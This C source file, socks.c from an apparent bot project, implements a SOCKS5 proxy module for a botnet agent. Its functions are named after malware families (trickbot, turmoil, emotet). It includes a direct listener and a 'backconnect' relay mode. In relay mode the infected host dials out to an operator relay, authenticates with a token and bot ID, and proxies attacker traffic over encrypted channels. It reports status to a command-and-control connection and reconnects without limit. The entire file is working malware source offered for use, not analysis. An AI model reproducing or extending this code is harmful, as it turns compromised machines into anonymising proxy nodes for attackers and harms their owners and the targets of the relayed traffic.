/* socks.c — SOCKS5 proxy: direct listener, auth */

#include "bot.h"

#define FUZZY_VER       0x05
#define FUZZY_AUTH_NONE 0x00
#define FUZZY_AUTH_PASS 0x02
#define FUZZY_AUTH_FAIL 0xFF
#define FUZZY_CMD_CONN  0x01
#define FUZZY_ATYP_V4   0x01
#define FUZZY_ATYP_DOM  0x03
#define FUZZY_ATYP_V6   0x04
#define FUZZY_REPLY_OK  0x00
#define FUZZY_REPLY_FAIL 0x01
#define FUZZY_REPLY_HOSTUNREACH 0x04

#define RELAY_BUF_SIZE   8192

/* ======================================================================
   HELPERS
   ====================================================================== */

/* Read exactly n bytes from fd. Returns 0 on success, -1 on failure. */
static int read_exact(int fd, uint8_t *buf, size_t n)
{
    size_t off = 0;
    while (off < n) {
        ssize_t r = read(fd, buf + off, n - off);
        if (r <= 0) return -1;
        off += (size_t)r;
    }
    return 0;
}

/* Write exactly n bytes to fd. Returns 0 on success, -1 on failure. */
static int write_all(int fd, const uint8_t *buf, size_t n)
{
    size_t off = 0;
    while (off < n) {
        ssize_t w = write(fd, buf + off, n - off);
        if (w <= 0) return -1;
        off += (size_t)w;
    }
    return 0;
}

/* Set socket to non-blocking (for poll-based relay). */
static void set_nonblock(int fd)
{
    int flags = fcntl(fd, F_GETFL, 0);
    if (flags >= 0) fcntl(fd, F_SETFL, flags | O_NONBLOCK);
}

/* Resolve hostname:port and connect. Returns fd or -1. */
static int tcp_connect(const char *host, uint16_t port)
{
    struct addrinfo hints, *res, *rp;
    char portbuf[8];
    int fd = -1;

    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    snprintf(portbuf, sizeof(portbuf), "%u", (unsigned)port);

    if (getaddrinfo(host, portbuf, &hints, &res) != 0)
        return -1;

    for (rp = res; rp; rp = rp->ai_next) {
        fd = socket(rp->ai_family, rp->ai_socktype, rp->ai_protocol);
        if (fd < 0) continue;
        if (connect(fd, rp->ai_addr, rp->ai_addrlen) == 0) break;
        close(fd);
        fd = -1;
    }
    freeaddrinfo(res);
    return fd;
}

/* ======================================================================
   BIDIRECTIONAL RELAY (two plain fds)
   ====================================================================== */

struct relay_pair {
    int fd_a;
    int fd_b;
};

static void *relay_a_to_b(void *arg)
{
    struct relay_pair *rp = (struct relay_pair *)arg;
    uint8_t buf[RELAY_BUF_SIZE];
    ssize_t n;

    while ((n = read(rp->fd_a, buf, sizeof(buf))) > 0) {
        if (write_all(rp->fd_b, buf, (size_t)n) < 0) break;
    }
    shutdown(rp->fd_b, SHUT_WR);
    return NULL;
}

static void set_recv_timeout(int fd, int secs)
{
    struct timeval tv;
    tv.tv_sec  = secs;
    tv.tv_usec = 0;
    setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
}

static void bidirectional_relay(int fd_a, int fd_b)
{
    struct relay_pair fwd, rev;
    pthread_t tid;

    /* Prevent relay threads from hanging forever on silent peers */
    set_recv_timeout(fd_a, 120);
    set_recv_timeout(fd_b, 120);

    fwd.fd_a = fd_a;
    fwd.fd_b = fd_b;
    rev.fd_a = fd_b;
    rev.fd_b = fd_a;

    pthread_create(&tid, NULL, relay_a_to_b, &fwd);

    /* reverse direction in current thread */
    {
        uint8_t buf[RELAY_BUF_SIZE];
        ssize_t n;
        while ((n = read(rev.fd_a, buf, sizeof(buf))) > 0) {
            if (write_all(rev.fd_b, buf, (size_t)n) < 0) break;
        }
        shutdown(rev.fd_b, SHUT_WR);
    }

    pthread_join(tid, NULL);
    close(fd_a);
    close(fd_b);
}

/* ======================================================================
   SOCKS5 HANDLER — trickbot
   ====================================================================== */

void trickbot(int client_fd)
{
    uint8_t buf[512];
    uint8_t nmethods, method;
    int need_auth, authed;
    uint8_t ver, cmd, atyp;
    char target_host[256];
    uint16_t target_port;
    int target_fd;
    size_t i;
    uint8_t reply[10];

    at_inc(&g_socks_count);

    /* --- greeting --- */
    if (read_exact(client_fd, buf, 2) < 0) goto fail;
    if (buf[0] != FUZZY_VER) goto fail;
    nmethods = buf[1];
    if (nmethods == 0 || nmethods > 255) goto fail;
    if (read_exact(client_fd, buf, nmethods) < 0) goto fail;

    /* Determine if auth is required */
    pthread_mutex_lock(&g_socks_creds_mtx);
    need_auth = !ds_empty(&g_proxy_user);
    pthread_mutex_unlock(&g_socks_creds_mtx);

    if (need_auth) {
        /* Look for username/password method */
        method = FUZZY_AUTH_FAIL;
        for (i = 0; i < nmethods; i++) {
            if (buf[i] == FUZZY_AUTH_PASS) { method = FUZZY_AUTH_PASS; break; }
        }
        { uint8_t resp[2]; resp[0] = FUZZY_VER; resp[1] = method;
          if (write_all(client_fd, resp, 2) < 0) goto fail; }
        if (method == FUZZY_AUTH_FAIL) goto fail;

        /* RFC 1929 username/password sub-negotiation */
        {
            uint8_t ulen, plen;
            char user[256], pass[256];
            int ok;

            if (read_exact(client_fd, buf, 2) < 0) goto fail;
            /* buf[0] is sub-negotiation version (0x01) */
            ulen = buf[1];
            if (ulen == 0) goto fail;
            if (read_exact(client_fd, (uint8_t *)user, ulen) < 0) goto fail;
            user[ulen] = '\0';
            if (read_exact(client_fd, buf, 1) < 0) goto fail;
            plen = buf[0];
            if (read_exact(client_fd, (uint8_t *)pass, plen) < 0) goto fail;
            pass[plen] = '\0';

            pthread_mutex_lock(&g_socks_creds_mtx);
            ok = (strcmp(user, ds_cstr(&g_proxy_user)) == 0 &&
                  strcmp(pass, ds_cstr(&g_proxy_pass)) == 0);
            pthread_mutex_unlock(&g_socks_creds_mtx);

            { uint8_t aresp[2]; aresp[0] = 0x01;
              aresp[1] = ok ? 0x00 : 0x01;
              if (write_all(client_fd, aresp, 2) < 0) goto fail; }
            if (!ok) goto fail;
        }
    } else {
        /* Look for no-auth method */
        method = FUZZY_AUTH_FAIL;
        for (i = 0; i < nmethods; i++) {
            if (buf[i] == FUZZY_AUTH_NONE) { method = FUZZY_AUTH_NONE; break; }
        }
        { uint8_t resp[2]; resp[0] = FUZZY_VER; resp[1] = method;
          if (write_all(client_fd, resp, 2) < 0) goto fail; }
        if (method == FUZZY_AUTH_FAIL) goto fail;
    }

    /* --- connect request --- */
    if (read_exact(client_fd, buf, 4) < 0) goto fail;
    ver  = buf[0];
    cmd  = buf[1];
    /* buf[2] is RSV */
    atyp = buf[3];

    if (ver != FUZZY_VER || cmd != FUZZY_CMD_CONN) {
        /* Send command not supported reply */
        memset(reply, 0, sizeof(reply));
        reply[0] = FUZZY_VER;
        reply[1] = 0x07; /* command not supported */
        reply[3] = FUZZY_ATYP_V4;
        write_all(client_fd, reply, 10);
        goto fail;
    }

    target_host[0] = '\0';
    target_port = 0;

    if (atyp == FUZZY_ATYP_V4) {
        uint8_t ipv4[4];
        if (read_exact(client_fd, ipv4, 4) < 0) goto fail;
        snprintf(target_host, sizeof(target_host), "%u.%u.%u.%u",
                 ipv4[0], ipv4[1], ipv4[2], ipv4[3]);
    } else if (atyp == FUZZY_ATYP_V6) {
        uint8_t ipv6[16];
        if (read_exact(client_fd, ipv6, 16) < 0) goto fail;
        inet_ntop(AF_INET6, ipv6, target_host, sizeof(target_host));
    } else if (atyp == FUZZY_ATYP_DOM) {
        uint8_t dlen;
        if (read_exact(client_fd, &dlen, 1) < 0) goto fail;
        if (dlen == 0 || dlen > 253) goto fail;
        if (read_exact(client_fd, (uint8_t *)target_host, dlen) < 0) goto fail;
        target_host[dlen] = '\0';
    } else {
        /* Address type not supported */
        memset(reply, 0, sizeof(reply));
        reply[0] = FUZZY_VER;
        reply[1] = 0x08; /* address type not supported */
        reply[3] = FUZZY_ATYP_V4;
        write_all(client_fd, reply, 10);
        goto fail;
    }

    /* Read port (2 bytes, network order) */
    {
        uint8_t portbuf[2];
        if (read_exact(client_fd, portbuf, 2) < 0) goto fail;
        target_port = (uint16_t)((portbuf[0] << 8) | portbuf[1]);
    }

    debug_log("socks5 connect: %s:%u", target_host, (unsigned)target_port);

    /* Connect to target */
    target_fd = tcp_connect(target_host, target_port);
    if (target_fd < 0) {
        memset(reply, 0, sizeof(reply));
        reply[0] = FUZZY_VER;
        reply[1] = FUZZY_REPLY_HOSTUNREACH;
        reply[3] = FUZZY_ATYP_V4;
        write_all(client_fd, reply, 10);
        goto fail;
    }

    /* Send success reply */
    memset(reply, 0, sizeof(reply));
    reply[0] = FUZZY_VER;
    reply[1] = FUZZY_REPLY_OK;
    reply[3] = FUZZY_ATYP_V4;
    /* BND.ADDR and BND.PORT are zeros — acceptable */
    if (write_all(client_fd, reply, 10) < 0) {
        close(target_fd);
        goto fail;
    }

    /* Relay data bidirectionally */
    bidirectional_relay(client_fd, target_fd);
    /* bidirectional_relay closes both fds */
    at_dec(&g_socks_count);
    return;

fail:
    close(client_fd);
    at_dec(&g_socks_count);
}

/* ======================================================================
   DIRECT LISTENER — turmoil
   ====================================================================== */

struct turmoil_ctx {
    int listener_fd;
};

struct trickbot_ctx {
    int client_fd;
};

static void *trickbot_thread(void *arg)
{
    struct trickbot_ctx *ctx = (struct trickbot_ctx *)arg;
    int fd = ctx->client_fd;
    free(ctx);
    trickbot(fd);
    return NULL;
}

static void *turmoil_accept_loop(void *arg)
{
    struct turmoil_ctx *ctx = (struct turmoil_ctx *)arg;
    int listener_fd = ctx->listener_fd;
    free(ctx);

    while (!at_load(&g_socks_stop)) {
        struct sockaddr_storage addr;
        socklen_t alen = sizeof(addr);
        int client_fd;
        struct pollfd pfd;

        pfd.fd = listener_fd;
        pfd.events = POLLIN;
        if (poll(&pfd, 1, 1000) <= 0) continue;

        client_fd = accept(listener_fd, (struct sockaddr *)&addr, &alen);
        if (client_fd < 0) continue;

        {
            struct trickbot_ctx *tc = (struct trickbot_ctx *)malloc(sizeof(*tc));
            pthread_t tid;
            tc->client_fd = client_fd;
            pthread_create(&tid, NULL, trickbot_thread, tc);
            pthread_detach(tid);
        }
    }
    return NULL;
}

int turmoil(const char *port, conn_t *c2)
{
    int listener_fd;
    struct sockaddr_in6 sa;
    int opt = 1;
    int portnum;
    struct turmoil_ctx *ctx;
    pthread_t tid;
    dstr msg;

    if (at_load(&g_socks_active)) {
        debug_log("socks already active");
        return -1;
    }

    portnum = atoi(port);
    if (portnum <= 0 || portnum > 65535) {
        debug_log("socks invalid port: %s", port);
        return -1;
    }

    listener_fd = socket(AF_INET6, SOCK_STREAM, 0);
    if (listener_fd < 0) {
        listener_fd = socket(AF_INET, SOCK_STREAM, 0);
        if (listener_fd < 0) return -1;

        {
            struct sockaddr_in sa4;
            memset(&sa4, 0, sizeof(sa4));
            sa4.sin_family = AF_INET;
            sa4.sin_port = htons((uint16_t)portnum);
            sa4.sin_addr.s_addr = INADDR_ANY;
            setsockopt(listener_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
            if (bind(listener_fd, (struct sockaddr *)&sa4, sizeof(sa4)) < 0) {
                close(listener_fd);
                return -1;
            }
        }
    } else {
        int v6only = 0;
        setsockopt(listener_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
        setsockopt(listener_fd, IPPROTO_IPV6, IPV6_V6ONLY, &v6only, sizeof(v6only));

        memset(&sa, 0, sizeof(sa));
        sa.sin6_family = AF_INET6;
        sa.sin6_port = htons((uint16_t)portnum);
        sa.sin6_addr = in6addr_any;
        if (bind(listener_fd, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
            close(listener_fd);
            return -1;
        }
    }

    if (listen(listener_fd, 64) < 0) {
        close(listener_fd);
        return -1;
    }

    pthread_mutex_lock(&g_socks_mtx);
    g_socks_listener_fd = listener_fd;
    at_store(&g_socks_stop, 0);
    at_store(&g_socks_active, 1);
    ds_set(&g_active_relay, "direct");
    pthread_mutex_unlock(&g_socks_mtx);

    debug_log("socks listener started on port %d", portnum);

    /* Notify C2 */
    if (c2) {
        ds_init(&msg);
        {
            char tmp[128];
            char addr[64];
            snprintf(addr, sizeof(addr), "0.0.0.0:%d", portnum);
            snprintf(tmp, sizeof(tmp), ds_cstr(&g_msg_socks_start_fmt), addr);
            ds_set(&msg, tmp);
        }
        vpn_writes(c2, ds_cstr(&msg));
        ds_free(&msg);
    }

    ctx = (struct turmoil_ctx *)malloc(sizeof(*ctx));
    ctx->listener_fd = listener_fd;
    pthread_create(&tid, NULL, turmoil_accept_loop, ctx);
    pthread_detach(tid);

    return 0;
}

/* ======================================================================
   STOP PROXY — emotet
   ====================================================================== */

static conn_t *g_relay_ctrl_conn = NULL;

void emotet(void)
{
    int fd;
    conn_t *rctrl;

    at_store(&g_socks_stop, 1);

    pthread_mutex_lock(&g_socks_mtx);
    fd = g_socks_listener_fd;
    g_socks_listener_fd = -1;
    rctrl = g_relay_ctrl_conn;
    g_relay_ctrl_conn = NULL;
    at_store(&g_socks_active, 0);
    ds_clear(&g_active_relay);
    pthread_mutex_unlock(&g_socks_mtx);

    if (fd >= 0) close(fd);
    if (rctrl && rctrl->fd >= 0) shutdown(rctrl->fd, SHUT_RDWR);

    debug_log("socks proxy stopped");
}

/* ======================================================================
   VPE2 I/O HELPERS (for relay backconnect mode)
   ====================================================================== */

static int socks_read_exact(conn_t *c, uint8_t *buf, size_t n)
{
    size_t off = 0;
    while (off < n) {
        ssize_t r = read(c->fd, buf + off, n - off);
        if (r <= 0) { c->valid = 0; return -1; }
        cipher_crypt(&c->recv_cipher, buf + off, (size_t)r);
        off += (size_t)r;
    }
    return 0;
}

static int vpn_write_exact(conn_t *c, const uint8_t *buf, size_t n)
{
    uint8_t *tmp;
    size_t off;
    ssize_t w;

    if (!c || !c->valid || n == 0) return -1;
    tmp = (uint8_t *)malloc(n);
    if (!tmp) return -1;
    memcpy(tmp, buf, n);
    cipher_crypt(&c->send_cipher, tmp, n);

    off = 0;
    while (off < n) {
        w = write(c->fd, tmp + off, n - off);
        if (w <= 0) { free(tmp); c->valid = 0; return -1; }
        off += (size_t)w;
    }
    free(tmp);
    return 0;
}

/* ======================================================================
   VPE2 <-> RAW BIDIRECTIONAL RELAY
   ====================================================================== */

struct vpn_relay_pair {
    conn_t *vpn;
    int     raw_fd;
};

static void *vpn_to_raw_thread(void *arg)
{
    struct vpn_relay_pair *p = (struct vpn_relay_pair *)arg;
    uint8_t buf[RELAY_BUF_SIZE];
    ssize_t n;

    while ((n = read(p->vpn->fd, buf, sizeof(buf))) > 0) {
        cipher_crypt(&p->vpn->recv_cipher, buf, (size_t)n);
        if (write_all(p->raw_fd, buf, (size_t)n) < 0) break;
    }
    shutdown(p->raw_fd, SHUT_WR);
    return NULL;
}

static void vpn_bidirectional_relay(conn_t *vpn, int raw_fd)
{
    struct vpn_relay_pair fwd;
    pthread_t tid;
    uint8_t buf[RELAY_BUF_SIZE];
    ssize_t n;
    uint8_t *tmp;

    fwd.vpn    = vpn;
    fwd.raw_fd = raw_fd;

    /* vpn -> raw in separate thread */
    pthread_create(&tid, NULL, vpn_to_raw_thread, &fwd);

    /* raw -> vpn in current thread */
    while ((n = read(raw_fd, buf, sizeof(buf))) > 0) {
        tmp = (uint8_t *)malloc((size_t)n);
        if (!tmp) break;
        memcpy(tmp, buf, (size_t)n);
        cipher_crypt(&vpn->send_cipher, tmp, (size_t)n);
        if (write_all(vpn->fd, tmp, (size_t)n) < 0) { free(tmp); break; }
        free(tmp);
    }

    pthread_join(tid, NULL);
    vpn_close(vpn);
    close(raw_fd);
}

/* ======================================================================
   SOCKS5 HANDLER — trickbot_relay (over VPE2 data channel)
   ====================================================================== */

static void trickbot_relay(conn_t *data)
{
    uint8_t buf[512];
    uint8_t nmethods, method;
    int need_auth;
    uint8_t ver, cmd, atyp;
    char target_host[256];
    uint16_t target_port;
    int target_fd;
    size_t i;
    uint8_t reply[10];

    at_inc(&g_socks_count);

    /* --- greeting --- */
    if (socks_read_exact(data, buf, 2) < 0) goto fail;
    if (buf[0] != FUZZY_VER) goto fail;
    nmethods = buf[1];
    if (nmethods == 0 || nmethods > 255) goto fail;
    if (socks_read_exact(data, buf, nmethods) < 0) goto fail;

    pthread_mutex_lock(&g_socks_creds_mtx);
    need_auth = !ds_empty(&g_proxy_user);
    pthread_mutex_unlock(&g_socks_creds_mtx);

    if (need_auth) {
        method = FUZZY_AUTH_FAIL;
        for (i = 0; i < nmethods; i++) {
            if (buf[i] == FUZZY_AUTH_PASS) { method = FUZZY_AUTH_PASS; break; }
        }
        { uint8_t resp[2]; resp[0] = FUZZY_VER; resp[1] = method;
          if (vpn_write_exact(data, resp, 2) < 0) goto fail; }
        if (method == FUZZY_AUTH_FAIL) goto fail;

        {
            uint8_t ulen, plen;
            char user[256], pass[256];
            int ok;

            if (socks_read_exact(data, buf, 2) < 0) goto fail;
            ulen = buf[1];
            if (ulen == 0) goto fail;
            if (socks_read_exact(data, (uint8_t *)user, ulen) < 0) goto fail;
            user[ulen] = '\0';
            if (socks_read_exact(data, buf, 1) < 0) goto fail;
            plen = buf[0];
            if (socks_read_exact(data, (uint8_t *)pass, plen) < 0) goto fail;
            pass[plen] = '\0';

            pthread_mutex_lock(&g_socks_creds_mtx);
            ok = (strcmp(user, ds_cstr(&g_proxy_user)) == 0 &&
                  strcmp(pass, ds_cstr(&g_proxy_pass)) == 0);
            pthread_mutex_unlock(&g_socks_creds_mtx);

            { uint8_t aresp[2]; aresp[0] = 0x01;
              aresp[1] = ok ? 0x00 : 0x01;
              if (vpn_write_exact(data, aresp, 2) < 0) goto fail; }
            if (!ok) goto fail;
        }
    } else {
        method = FUZZY_AUTH_FAIL;
        for (i = 0; i < nmethods; i++) {
            if (buf[i] == FUZZY_AUTH_NONE) { method = FUZZY_AUTH_NONE; break; }
        }
        { uint8_t resp[2]; resp[0] = FUZZY_VER; resp[1] = method;
          if (vpn_write_exact(data, resp, 2) < 0) goto fail; }
        if (method == FUZZY_AUTH_FAIL) goto fail;
    }

    /* --- connect request --- */
    if (socks_read_exact(data, buf, 4) < 0) goto fail;
    ver  = buf[0];
    cmd  = buf[1];
    atyp = buf[3];

    if (ver != FUZZY_VER || cmd != FUZZY_CMD_CONN) {
        memset(reply, 0, sizeof(reply));
        reply[0] = FUZZY_VER;
        reply[1] = 0x07;
        reply[3] = FUZZY_ATYP_V4;
        vpn_write_exact(data, reply, 10);
        goto fail;
    }

    target_host[0] = '\0';
    target_port = 0;

    if (atyp == FUZZY_ATYP_V4) {
        uint8_t ipv4[4];
        if (socks_read_exact(data, ipv4, 4) < 0) goto fail;
        snprintf(target_host, sizeof(target_host), "%u.%u.%u.%u",
                 ipv4[0], ipv4[1], ipv4[2], ipv4[3]);
    } else if (atyp == FUZZY_ATYP_V6) {
        uint8_t ipv6[16];
        if (socks_read_exact(data, ipv6, 16) < 0) goto fail;
        inet_ntop(AF_INET6, ipv6, target_host, sizeof(target_host));
    } else if (atyp == FUZZY_ATYP_DOM) {
        uint8_t dlen;
        if (socks_read_exact(data, &dlen, 1) < 0) goto fail;
        if (dlen == 0 || dlen > 253) goto fail;
        if (socks_read_exact(data, (uint8_t *)target_host, dlen) < 0) goto fail;
        target_host[dlen] = '\0';
    } else {
        memset(reply, 0, sizeof(reply));
        reply[0] = FUZZY_VER;
        reply[1] = 0x08;
        reply[3] = FUZZY_ATYP_V4;
        vpn_write_exact(data, reply, 10);
        goto fail;
    }

    {
        uint8_t portbuf[2];
        if (socks_read_exact(data, portbuf, 2) < 0) goto fail;
        target_port = (uint16_t)((portbuf[0] << 8) | portbuf[1]);
    }

    debug_log("relay socks5: %s:%u", target_host, (unsigned)target_port);

    target_fd = tcp_connect(target_host, target_port);
    if (target_fd < 0) {
        memset(reply, 0, sizeof(reply));
        reply[0] = FUZZY_VER;
        reply[1] = FUZZY_REPLY_HOSTUNREACH;
        reply[3] = FUZZY_ATYP_V4;
        vpn_write_exact(data, reply, 10);
        goto fail;
    }

    memset(reply, 0, sizeof(reply));
    reply[0] = FUZZY_VER;
    reply[1] = FUZZY_REPLY_OK;
    reply[3] = FUZZY_ATYP_V4;
    if (vpn_write_exact(data, reply, 10) < 0) {
        close(target_fd);
        goto fail;
    }

    /* Bridge: VPE2 data channel <-> raw target */
    vpn_bidirectional_relay(data, target_fd);
    at_dec(&g_socks_count);
    return;

fail:
    vpn_close(data);
    at_dec(&g_socks_count);
}

/* ======================================================================
   RELAY SESSION THREAD — spawned per RELAY_NEW
   ====================================================================== */

struct relay_session_ctx {
    char host[256];
    char port[16];
    char session_id[64];
};

static void *relay_session_thread(void *arg)
{
    struct relay_session_ctx *ctx = (struct relay_session_ctx *)arg;
    conn_t *data;
    char line[256];

    debug_log("relay session %s: connecting", ctx->session_id);

    data = vpn_connect(ctx->host, ctx->port);
    if (!data) {
        debug_log("relay session %s: connect failed", ctx->session_id);
        free(ctx);
        return NULL;
    }

    snprintf(line, sizeof(line), "RELAY_DATA:%s\n", ctx->session_id);
    vpn_writes(data, line);

    trickbot_relay(data);
    free(ctx);
    return NULL;
}

/* ======================================================================
   RELAY CONTROL LOOP — reads RELAY_NEW messages, sends keepalive
   ====================================================================== */

struct relay_backconnect_ctx {
    char host[256];
    char port[16];
    conn_t *ctrl;
    conn_t *c2;   /* C2 connection — for sending status messages back */
};

#define RELAY_JOIN_RETRIES      3
#define RELAY_RECONNECT_DELAY   5   /* seconds between reconnect attempts */
#define RELAY_LONG_PAUSE        300 /* 5 minutes in seconds */
#define RELAY_PAUSE_EVERY       10  /* pause after this many reconnect attempts */

/* Try to connect and authenticate to the relay. Returns conn_t* or NULL. */
static conn_t *relay_try_connect(const char *host, const char *port)
{
    conn_t *ctrl;
    char auth_msg[512];
    dstr resp;

    ctrl = vpn_connect(host, port);
    if (!ctrl) return NULL;

    snprintf(auth_msg, sizeof(auth_msg), "RELAY_AUTH:%s:%s\n",
             SYNC_TOKEN, ds_cstr(&g_bot_id));
    vpn_writes(ctrl, auth_msg);

    resp = vpn_read_line(ctrl, 10);
    if (strcmp(ds_cstr(&resp), "RELAY_OK") != 0) {
        debug_log("relay: auth failed: %s", ds_cstr(&resp));
        ds_free(&resp);
        vpn_close(ctrl);
        return NULL;
    }
    ds_free(&resp);
    return ctrl;
}

static void *relay_backconnect_thread(void *arg)
{
    struct relay_backconnect_ctx *ctx = (struct relay_backconnect_ctx *)arg;
    conn_t *ctrl = ctx->ctrl;
    int reconnect_count = 0;

    for (;;) {
        /* ── Control loop: handle relay commands ── */
        while (!at_load(&g_socks_stop) && ctrl->valid) {
            dstr line = vpn_read_line(ctrl, 60);

            if (at_load(&g_socks_stop)) {
                ds_free(&line);
                goto done;
            }

            if (ds_len(&line) == 0) {
                ds_free(&line);
                if (!ctrl->valid) break;
                /* timeout — send keepalive */
                vpn_writes(ctrl, "\n");
                continue;
            }

            if (strncmp(ds_cstr(&line), "RELAY_NEW:", 10) == 0) {
                const char *sid = ds_cstr(&line) + 10;
                struct relay_session_ctx *sctx;
                pthread_t tid;

                sctx = (struct relay_session_ctx *)malloc(sizeof(*sctx));
                if (sctx) {
                    strncpy(sctx->host, ctx->host, sizeof(sctx->host) - 1);
                    sctx->host[sizeof(sctx->host) - 1] = '\0';
                    strncpy(sctx->port, ctx->port, sizeof(sctx->port) - 1);
                    sctx->port[sizeof(sctx->port) - 1] = '\0';
                    strncpy(sctx->session_id, sid, sizeof(sctx->session_id) - 1);
                    sctx->session_id[sizeof(sctx->session_id) - 1] = '\0';

                    pthread_create(&tid, NULL, relay_session_thread, sctx);
                    pthread_detach(tid);
                }
            }

            ds_free(&line);
        }

        /* ── Disconnected — check if we should stop ── */
        if (at_load(&g_socks_stop))
            goto done;

        vpn_close(ctrl);
        ctrl = NULL;

        debug_log("relay: disconnected from %s:%s, attempting reconnect", ctx->host, ctx->port);

        /* Notify C2 that relay dropped */
        if (ctx->c2 && ctx->c2->valid) {
            char sbuf[320];
            snprintf(sbuf, sizeof(sbuf), "[socks] relay disconnected %s:%s\n", ctx->host, ctx->port);
            vpn_writes(ctx->c2, sbuf);
        }

        /* Clear ctrl conn but keep g_socks_active=1 — thread is still running.
         * Clearing g_socks_active=0 here would allow C2 to spawn a second
         * relay_backconnect_thread, causing two competing threads. */
        pthread_mutex_lock(&g_socks_mtx);
        g_relay_ctrl_conn = NULL;
        pthread_mutex_unlock(&g_socks_mtx);

        /* ── Reconnect loop (unlimited, pause 5min every 10 attempts) ── */
        while (!at_load(&g_socks_stop)) {
            reconnect_count++;

            if (reconnect_count > 0 && (reconnect_count % RELAY_PAUSE_EVERY) == 0) {
                debug_log("relay: %d reconnect attempts, pausing %ds", reconnect_count, RELAY_LONG_PAUSE);
                sleep(RELAY_LONG_PAUSE);
                if (at_load(&g_socks_stop)) goto done;
            } else {
                sleep(RELAY_RECONNECT_DELAY);
                if (at_load(&g_socks_stop)) goto done;
            }

            debug_log("relay: reconnect attempt %d to %s:%s", reconnect_count, ctx->host, ctx->port);
            ctrl = relay_try_connect(ctx->host, ctx->port);
            if (ctrl) {
                debug_log("relay: reconnected to %s:%s (attempt %d)", ctx->host, ctx->port, reconnect_count);
                reconnect_count = 0;

                pthread_mutex_lock(&g_socks_mtx);
                g_relay_ctrl_conn = ctrl;
                at_store(&g_socks_active, 1);
                pthread_mutex_unlock(&g_socks_mtx);

                /* Notify C2 that relay is back */
                if (ctx->c2 && ctx->c2->valid) {
                    char sbuf[320];
                    snprintf(sbuf, sizeof(sbuf), "[socks] started on relay:%s:%s\n", ctx->host, ctx->port);
                    vpn_writes(ctx->c2, sbuf);
                }

                break; /* back to control loop */
            }
        }

        if (at_load(&g_socks_stop) || !ctrl)
            goto done;
    }

done:
    /* Notify C2 that proxy is fully stopped */
    if (ctx->c2 && ctx->c2->valid) {
        vpn_writes(ctx->c2, "[socks] proxy stopped\n");
    }

    /* cleanup */
    pthread_mutex_lock(&g_socks_mtx);
    g_relay_ctrl_conn = NULL;
    at_store(&g_socks_active, 0);
    ds_clear(&g_active_relay);
    pthread_mutex_unlock(&g_socks_mtx);

    if (ctrl) vpn_close(ctrl);
    free(ctx);
    debug_log("relay control loop ended");
    return NULL;
}

/* ======================================================================
   RELAY BACKCONNECT — entry point
   ====================================================================== */

int relay_backconnect(const char *host, const char *port, conn_t *c2)
{
    conn_t *ctrl = NULL;
    struct relay_backconnect_ctx *ctx;
    pthread_t tid;
    int attempt;

    if (at_load(&g_socks_active)) {
        debug_log("relay: already active");
        return 1; /* 1 = already active (not an error) */
    }

    /* Initial join: retry up to 3 times */
    for (attempt = 0; attempt < RELAY_JOIN_RETRIES; attempt++) {
        if (attempt > 0) {
            debug_log("relay: join retry %d/%d in %ds", attempt + 1, RELAY_JOIN_RETRIES, RELAY_RECONNECT_DELAY);
            sleep(RELAY_RECONNECT_DELAY);
        }
        debug_log("relay: connecting to %s:%s (attempt %d/%d)", host, port, attempt + 1, RELAY_JOIN_RETRIES);
        ctrl = relay_try_connect(host, port);
        if (ctrl) break;
    }

    if (!ctrl) {
        debug_log("relay: failed to join after %d attempts", RELAY_JOIN_RETRIES);
        return -1;
    }

    pthread_mutex_lock(&g_socks_mtx);
    g_relay_ctrl_conn = ctrl;
    at_store(&g_socks_stop, 0);
    at_store(&g_socks_active, 1);
    {
        char addr[280];
        snprintf(addr, sizeof(addr), "relay:%s:%s", host, port);
        ds_set(&g_active_relay, addr);
    }
    pthread_mutex_unlock(&g_socks_mtx);

    debug_log("relay: authenticated to %s:%s", host, port);

    ctx = (struct relay_backconnect_ctx *)malloc(sizeof(*ctx));
    strncpy(ctx->host, host, sizeof(ctx->host) - 1);
    ctx->host[sizeof(ctx->host) - 1] = '\0';
    strncpy(ctx->port, port, sizeof(ctx->port) - 1);
    ctx->port[sizeof(ctx->port) - 1] = '\0';
    ctx->ctrl = ctrl;
    ctx->c2 = c2;

    pthread_create(&tid, NULL, relay_backconnect_thread, ctx);
    pthread_detach(tid);

    return 0;
}
